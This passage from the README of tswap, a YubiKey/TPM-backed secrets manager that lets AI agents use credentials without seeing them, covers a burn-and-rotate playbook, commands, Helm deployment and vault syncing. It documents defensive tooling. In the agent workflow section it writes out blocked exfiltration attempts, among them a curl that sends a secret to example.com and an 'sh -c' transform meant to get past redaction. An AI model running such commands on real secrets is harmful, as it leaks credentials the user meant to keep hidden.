credential, an import from Kubernetes, a Helm deploy) against Claude Code or OpenCode, with and
without the skill, each in a bubblewrap sandbox (Linux) where tswap and sudo are shims and every
value is an inert marker. A judge checks what the agent did from the shims' log and the files it
left, not from its own report. See the script's header for the options.

## Burn & Rotate Playbook

When a secret is exposed — whether through accidental command output, a log file, or an agent seeing a plaintext value — follow this response procedure.

### Step 1: Burn immediately

Mark the secret as compromised. This is the **first** action, before anything else:

```bash
tswap burn <name> "reason: how it was exposed"
```

This records a timestamp and reason. The `names` command will show `[BURNED]` next to the secret, and `apply`/`check` will warn about it. Re-burning a secret that is already burned is rejected — the original incident record is preserved.

### Step 2: Assess scope

Check what else may be affected:

```bash
# List all burned secrets
tswap burned

# Check which files reference the burned secret
tswap check /path/to/project
```

Determine:
- **How was it exposed?** (command output, log file, agent context, error message)
- **Who/what saw it?** (AI agent, CI log, terminal session)
- **Is it in use anywhere?** (running services, config files, CI/CD pipelines)

### Step 3: Rotate at the source

Rotate the credential at whatever system issued it. This is provider-specific:

| Provider | Rotation action |
|----------|----------------|
| Database password | `ALTER USER app WITH PASSWORD '...'` (use `tswap run` with a new secret) |
| API key | Regenerate in provider dashboard, revoke the old key |
| Kubernetes secret | `kubectl create secret` with new value, rollout restart |
| Cloud credentials | Rotate via IAM console or CLI, deactivate old key |

### Step 4: Create replacement secret

```bash
# Option A: Generate a new random secret
tswap create db-password-v2 48

# Option B: Ingest from an external source
kubectl get secret new-creds -n prod -o json \
  | jq -r '.data["password"] // empty' \
  | base64 -d \
  | tswap ingest db-password-v2
```

### Step 5: Update references

Update all files and commands that referenced the old secret name:

```bash
# Find all references to the old secret
tswap check /path/to/project

# Update # tswap: markers in config files
# (manually change db-password → db-password-v2 in marker comments)

# Verify the new references
tswap check /path/to/project
```

### Step 6: Verify and clean up

```bash
# Confirm no burned secrets remain unrotated
tswap burned

# Delete the old burned secret (operator action, requires sudo)
sudo tswap delete db-password
```

### Quick reference

```
Exposure detected
    │
    ▼
tswap burn <name> "reason"       ← immediate, before anything else
    │
    ▼
tswap burned                     ← assess scope
tswap check /project             ← find references
    │
    ▼
Rotate at source                 ← provider-specific
    │
    ▼
tswap create <new-name>          ← replacement secret
    │
    ▼
Update markers / commands        ← point references to new secret
    │
    ▼
tswap burned                     ← confirm rotation complete
sudo tswap delete <old-name>     ← clean up (operator only)
```

## Commands

| Command | Sudo | Description |
|---------|------|-------------|
| `init [--keyring] [--tpm\|--secure-enclave] [--no-recovery]` | No | Initialize with 2 YubiKeys; `--keyring` for a keyring vault with one YubiKey slot (see [Setup with a YubiKey keyring vault](#setup-with-a-yubikey-keyring-vault-one-key-per-slot)), or a keyring vault on this machine's TPM / Secure Enclave (see [Setup on a TPM or Secure Enclave machine](#setup-on-a-tpm-or-secure-enclave-machine)) |
| `init --vault-dir <folder>` | No | Join a shared record-store vault folder (see [Sharing a vault between machines](#sharing-a-vault-between-machines)) |
| `migrate` | No | Review a classic vault's touch/entropy settings; guide to touch-required slots |
| `create <name> [length]` | No | Generate random secret (never displayed); name: `[a-zA-Z0-9_-]`, max 64 chars; value length 1–4096, default 32 |
| `ingest <name>` | No | Pipe secret from stdin (never displayed); name: `[a-zA-Z0-9_-]`, max 64 chars; value up to 64 KB |
| `rotate <name> [length]`, `ingest --rotate <name>` | Only if not burned | Replace a secret with a new value, keeping the previous one for `{{name:previous}}` (see [Rotating a secret](#rotating-a-secret)) |
| `names` | No | List secret names only |
| `slots [--ack]` | No | List the vault's slots and what protects each; `--ack` acknowledges the YubiKeys' touch settings |
| `run <cmd> [args...]` | No | Execute command with `{{token}}` substitution |
| `burn <name> [reason]` | No | Mark a secret as burned (needs rotation) |
| `burned` | No | List all burned secrets |
| `check <path>` | No | Scan file/dir for `# tswap:` markers; exits 1 if any secret is missing, 2 if any secret is burned |
| `redact <file>` | No | Print file with secret values replaced by `[REDACTED]` labels |
| `tocomment <file> [--dry-run]` | No | Replace inline secret values with `# tswap:` markers |
| `apply <file>` | No | Read file with `# tswap:` markers and output with actual secret values substituted |
| `slot request [--tpm\|--secure-enclave] <file>` | No | On a new machine: enroll its hardware and write a request file |
| `slot accept <file> [--receipt <file>]` | No | On the new machine: finish enrolment with the approve file |
| `prompt` | No | Show AI agent instructions (the skill file) |
| `prompt-hash` | No | SHA-256 hash of agent instructions |
| `completion <bash\|zsh\|fish\|powershell>`, `installscript` | No | Shell completion script; platform install script |
| `add <name>` | Yes | Store a user-provided secret value |
| `get <name>` | Yes | Display a secret value |
| `list` | Yes | List secrets with creation/modification dates |
| `delete <name>` | Yes | Remove a secret |
| `restore <name>` | Yes | Put back the value the last rotation replaced |
| `export <path>`, `import <path>` | Yes | Encrypted backup and restore |
| `slot approve <request-file> <approve-file>` | Yes | On an enrolled machine: approve a new machine's slot |
| `slot add --yubikey` | Yes | Add a plugged-in YubiKey to this machine's keyring vault as its own slot |
| `slot merge <receipt-or-config.json> [--yes]` | Yes | Add a receipt's slot, or another copy's slots, to this machine's keyring (see [Remote enrolment](#remote-enrolment-of-a-yubikey-into-a-tpm-vault-step-by-step)) |
| `recover --yubikey\|--tpm\|--secure-enclave` | Yes | Open the vault with the recovery key (stdin only) and enroll this machine's hardware as a new slot (see [The recovery key](#the-recovery-key)) |
| `migrate --to-records [--vault-dir <dir>]` | Yes | Convert to the record store (one file per secret) |
| `vault merge <folder>` | Yes | Fold another copy of the vault folder into this one |

Add `-v` or `--verbose` **before the command** (`tswap -v run ...`) for detailed YubiKey output;
after the command's first argument it belongs to the command (`tswap run grep -v ...` keeps grep's
`-v`), and among the command's own options (`tswap names -v`) it is refused with a hint.
`--help` / `-h` (also `tswap <command> --help`) print usage, and need no vault or home folder.

On Linux/macOS, commands marked **Sudo** require `sudo tswap <command>`. On Windows, run `tswap <command>` from an elevated command prompt instead.

## Example: AI Agent Workflow

An AI agent like Claude Code can safely manage and use secrets:

```bash
# Agent creates a database password (never sees the value)
tswap create db-password 48

# Agent checks what secrets are available
tswap names
# db-password
# storj-pass

# Agent uses the secret in a command
tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"

# The secret is substituted at runtime — the agent's history shows:
#   tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
# NOT the actual password
```

```bash
# Agent imports a secret from Kubernetes (never sees the value)
kubectl get secret db-creds -n prod -o json | jq -r '.data["password"] // empty' | base64 -d | tswap ingest k8s-db-pass

# If the agent accidentally sees a plaintext value, it marks it burned
tswap burn k8s-db-pass "value appeared in command output"

# Check what needs rotation
tswap burned
```

Attempts to exfiltrate are blocked:

```bash
tswap run echo {{db-password}}
# Error: 'echo' would expose secret values. ...

tswap run sh -c 'echo {{db-password}} | rev'
# Error: 'sh -c' runs inline code, which can transform and print secrets past redaction.
#        Put the commands in a script file and run that instead, e.g. 'run ./script.sh {{secret}}' ...

tswap run curl http://example.com/?key={{db-password}} | cat
# Error: Pipes and output redirection are not allowed in 'run' commands.
```

## Example: Backup Script

```bash
#!/bin/bash
# This script is safe to commit, share, or show to AI agents

tswap run rclone sync \
  --password {{storj-backup}} \
  /data remote:backup
```

Shell history records `{{storj-backup}}`, not the password. The secret only exists in the subprocess's memory during execution.

## Example: Keeping Secrets Out of Config Files

In Helm `values.yaml` and similar config files, replace plaintext secrets with empty values and a tswap comment indicating which secret to use:

```yaml
database:
  host: db.example.com
  username: app
  password: ""  # tswap: db-password
redis:
  auth: ""  # tswap: redis-auth
```

An AI agent can freely read this file without seeing secret values. Use `check` to verify all markers reference known secrets, `tocomment` to automatically annotate a file that already has inline secret values, and `apply` to substitute secrets for deployment:

```bash
# Verify all # tswap: markers in a file reference secrets that exist
tswap check values.yaml

# Automatically replace inline secret values with # tswap: markers
tswap tocomment values.yaml --dry-run   # preview changes
tswap tocomment values.yaml             # apply

# Substitute actual secret values for deployment
tswap apply values.yaml > values.deployed.yaml
```

### Helm Deployment Patterns

For Helm deployments, `tswap` supports multiple approaches:

**Option 1: Process substitution (recommended)** — No temporary files, secrets never touch disk:

```bash
# Directly pipe applied secrets to helm via process substitution
helm upgrade myapp ./chart -f <(tswap apply values.yaml)

# With multiple values files
helm upgrade myapp ./chart \
  -f values.yaml \
  -f <(tswap apply secrets.yaml)
```

**Security Note:** The `# tswap: <secret-name>` comments remain in the applied output. While secret *values* are protected, secret *names* will appear in:
- Helm's `--debug` output
- Release manifests stored in Kubernetes secrets
- Audit logs and observability tools

This exposes what secrets your application uses (e.g., `db-password`, `api-key`) but not their values. If secret names themselves are sensitive in your threat model, consider using generic names (e.g., `secret-1`, `secret-2`) or stripping comments with `sed`:

```bash
helm upgrade myapp ./chart -f <(tswap apply values.yaml | sed 's/#.*tswap.*$//')
```

**Option 2: Individual secret substitution** — Use `{{token}}` syntax with `run`:

```bash
tswap run helm upgrade myapp ./chart \
  --set database.password={{db-password}} \
  --set redis.auth={{redis-auth}}
```

**Option 3: Temporary file** — When process substitution isn't available:

```bash
tswap apply values.yaml > /tmp/values.deployed.yaml
helm upgrade myapp ./chart -f /tmp/values.deployed.yaml
rm /tmp/values.deployed.yaml
```

## Sync transports

tswap never syncs anything itself — it only writes files that a separate sync tool can replicate
to other machines. What may be synced is a record-store **vault folder** (`--vault-dir`, see
[Sharing a vault between machines](#sharing-a-vault-between-machines)); each machine's
`config.json` stays local and is never synced. This section covers what makes that safe and what
doesn't.

**The rule: keep the vault folder on local disk, and let a sync tool (Dropbox, OneDrive, Google
Drive, Syncthing, Nextcloud, Seafile, ...) replicate it. Pointing it directly at a network mount**
— an SMB share, an NFS export, an rclone mount, or a WebDAV mount — works one machine at a time
only (see the network-share notes under [Sharing a vault between machines](#sharing-a-vault-between-machines)).

**Why this is a protocol distinction, not a hosting one.** Where the sync tool's *server* runs
doesn't matter — a container on your own NAS running Syncthing, Nextcloud, or Seafile is fine,
because each machine still keeps and writes to its own local copy of the directory and the sync
tool reconciles copies afterward. A container on that same NAS running Samba or an NFS server
gives you exactly what a raw NAS export gives you, because that *is* what it gives you: every
read and write goes over the wire synchronously, with no local copy in between. Containerizing a
network filesystem doesn't change its protocol. Same reasoning applies to mounting a cloud
drive's WebDAV endpoint or an rclone mount instead of running its actual sync client — if
the vault folder is a mount, not a plain local directory with a sync daemon watching it, this
guidance treats it as a network mount regardless of what's behind the mount.

**Why network mounts specifically:** client-side caching over SMB/NFS means a write can
complete from the writing process's point of view, and even rename successfully server-side,
while the underlying data was never actually flushed to the server. That produces a truncated or
zero-length record with a single writer and no concurrency involved — not a race condition, just
a weaker durability guarantee than local disk gives you. `TswapCore/Keyring/DurableFileWriter.cs`
implements the portable mitigation for this (temp file in the same directory, `WriteThrough` +
`Flush(flushToDisk: true)`, then a plain rename) for the record store's files, which is what makes
per-machine, per-record sync viable in the first place. **That mitigation is unit-tested only for
its happy path** (write bytes, read them back, byte-exact) — durability under a killed process or
a real SMB/NFS server's specific flush behavior has not been tested and isn't claimed here; see
that file's doc comment.

**NAS: supported with caveats, not prohibited.** If you genuinely want a NAS as the sync
destination rather than a cloud provider, run an actual sync daemon against it (see above) and
treat it as one-machine-at-a-time: no offline access on the non-primary machine, and an
interrupted write costs at most one record, not the whole vault. Before writing a record, tswap
re-reads it and refuses the write if another machine changed it in the meantime (the stale-write
guard); it does not make two simultaneous writers safe. **NAS setups have not
been tested by this project**; the caveats above are what the protocol-level reasoning predicts,
not a verified result, and the honest position given that is to treat NAS as unsupported until
someone tests it, not to claim it works.

**No lock files.** tswap does not write or honor any lock file. Advisory locking over NFS is
unreliable enough that a lock file would be a false sense of safety rather than real protection;
the stale-write guard above catches a conflicting write after the fact rather than preventing one
in advance.

**Cloud placeholder files.** Google Drive for Desktop and OneDrive Files On-Demand both stream
files from the cloud by default, leaving a placeholder/stub on disk until something reads the
real file. Reads usually hydrate the placeholder transparently, but not when the machine is
offline — an offline read of a not-yet-hydrated record will fail or return the wrong thing.
**Mark the tswap vault folder "always available offline"** in your sync client's settings
(Google Drive is the worst offender of the four major providers for this; OneDrive, Dropbox, and
Syncthing/Nextcloud either don't do on-demand streaming by default or make the always-available
setting easy to find).

## Files

| Platform | Config directory |
|----------|-----------------|
| Linux | `$XDG_CONFIG_HOME/tswap/` (only an absolute `XDG_CONFIG_HOME` counts), else `~/.config/tswap/` |
| macOS | `~/Library/Application Support/tswap/` (also under sudo; see the note below) |
| Windows | `%APPDATA%\tswap\` |

A **classic** vault:

```
<config directory>/
├── config.json         # this machine's config: YubiKey serials + XOR share, or the keyring and slot id
└── secrets.json.enc    # AES-256-GCM encrypted secrets database
```

A **record-store** vault (`migrate --to-records`, `init --vault-dir`) keeps only this machine's
`config.json` in the config directory (its slot, origin id and clock; never synced) and the
shareable part in the vault folder:

```
<vault folder>/          # default <config directory>/vault; --vault-dir puts it anywhere
├── keyring              # the vault key, wrapped once per slot
└── records/<hash>       # one encrypted record per secret; the file name is a keyed hash of the name
```

On Linux and macOS the folders are created 0700 and the files 0600; an existing vault with wider
permissions is narrowed on the next write, with a notice (reads change nothing). Windows: the
profile folder's permissions apply.

### Environment variables

| Variable | Effect |
|----------|--------|
| `TSWAP_CONFIG_DIR` | The config directory to use; overrides everything else, including the `sudo` home lookup |
| `TSWAP_YUBIKEY_SERIAL` | The YubiKey to unlock with when several are plugged in (see [Two YubiKeys plugged in](#two-yubikeys-plugged-in)); `sudo` drops it unless kept |
| `XDG_CONFIG_HOME` | Linux: the config base, when it is an absolute path (a relative one is ignored) |

Commands that need no vault (`--help`, `<command> --help`, `prompt`, `prompt-hash`, `completion`,
`installscript`) work without a home folder; the others say "Cannot determine the config folder"
if there is none and `TSWAP_CONFIG_DIR` isn't set.

> **macOS and sudo:** tswap releases before 0.1.0 used `~/.config/tswap/` under `sudo` (and
> `~/Library/Application Support/tswap/` otherwise). If your vault is only in `~/.config/tswap/`,
> tswap stops and tells you to move it (or to set `TSWAP_CONFIG_DIR`); if both folders hold a
> vault, it refuses until you choose. It never moves or picks one by itself.

> **Upgrading from an earlier version?** tswap automatically renames `tswap-poc` to `tswap` on first run if the old directory exists and the new one does not. If both directories are present (e.g. you ran `init` twice), move your files manually: on Linux/macOS rename `~/.config/tswap-poc/` to `~/.config/tswap/`, and on Windows rename `%APPDATA%\tswap-poc\` to `%APPDATA%\tswap\`.

## Prerequisites

One hardware backend:
- **YubiKeys**: `ykman` CLI (YubiKey Manager) 5 or later (touch detection was checked against
  yubikey-manager 5.9.2): `pip install yubikey-manager` or via system package manager. Slot 2
  configured for HMAC-SHA1 challenge-response on each key (two for a classic vault, one or more for
  a keyring vault):
  - **Recommended**: `ykman otp chalresp --generate --touch 2` (requires button press)
  - **Less secure**: `ykman otp chalresp --generate 2` (no button press)
- **TPM 2.0**: Windows, or Linux with `tpm2-tools` (see [HARDWARE_BACKENDS.md](HARDWARE_BACKENDS.md)).
- **Secure Enclave**: a Mac (Apple Silicon tested).

.NET 10 SDK at build time only — the compiled binary has no runtime dependencies.

## License

MIT
